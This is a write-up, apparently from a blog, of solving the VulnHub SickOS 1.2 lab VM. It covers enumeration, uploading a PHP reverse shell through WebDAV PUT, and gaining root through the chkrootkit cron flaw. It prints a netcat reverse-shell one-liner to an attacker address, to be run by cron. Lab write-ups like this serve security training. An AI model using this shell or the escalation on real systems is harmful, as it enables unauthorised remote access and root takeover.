---
title: SickOS 1.2 - VulnHub VM Challenge
date: 2021-08-04 20:36:58
author: 01_susil
author_url: https://twitter.com/Susilkessav1
categories:
 - Pentest
 - VulnHub
tags:
 - Vulnhub
 - WriteUp
 - SickOS 1.2
   

---

How to crack SickOS1.2 VM lab without Metasploit.

tl;dr

+ Chkrootkit 0.49
+ Privilege escalation using Cronjob.

<!--more-->

Solved by: [01_susil](https://twitter.com/Susilkessav1)

This is a Linux box with IP 192.168.12.9

## Initial Analysis

Doing a Port scan [nmap enumerator](https://github.com/nmap/nmap), Basic scan.

![Nmap](first.png)

The system is running OpenSSH, web server lighttpd 1.4.28. Running a background check for known vulnerabilites.

Opening up the browser to check for more details.

![website](second.png)

There was nothing much information on this page. It contained only a meme

Opening up the [Dirb](https://github.com/v0re/dirb) Web Content Scanner to check for more information.

![dirb](third.png)

/test/ directory has been found from Dirb scan.

Let's Checkout the /test directory.

![test](fourth.png)

It looks like a WebDAV directory. WebDAV is a long-standing protocol that enables a webserver to act as a fileserver and support collaborative authoring of content on the web.

![curl](fifth.png)

PUT method is meant for "uploading" stuff to a particular URI, or overwriting what is already in that URI.
Here the PUT method is allowed! Uploading a [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) should work.

## Exploit

![revshell](sixth.png)

Netcat is a utility which reads and writes data across network connections using TCP or UDP protocol. 
Setup [Netcat](https://www.geeksforgeeks.org/netcat-basic-usage-and-overview/) listener to spawn a reverse shell.

![shell](seventh.png)

We don't have root access till now, let's list the directory.

![ls](eighth.png)

![cron](ninth.png)

Checking [cron jobs](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/), found the [chkrootkit](https://www.exploit-db.com/exploits/33899) and its version.
Cron job is a time-based job scheduler. Users use cron to schedule jobs to run periodically at fixed times.
Chkrootkit is a shell script that checks system binaries for rootkit modification.

![expl](tenth.png)

Create a file named Update which contained 
  - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.222 443 >/tmp/f

rm removes /tmp/f 
mkfifo creates a fifo file with name pathname /tmp/f
2>&1 command pipe stdout and stderr to command.
nc is netcat tool to spawn a reverse shell.  
Now to make update file as executed file I'm using " chmod 777 update ".

Now cronjob will execute the update file every minute. Setup a netcat listener on port 443 which is mentioned in the update file.

![root](eleventh.png)

And that's how I solved SickOS 1.2!
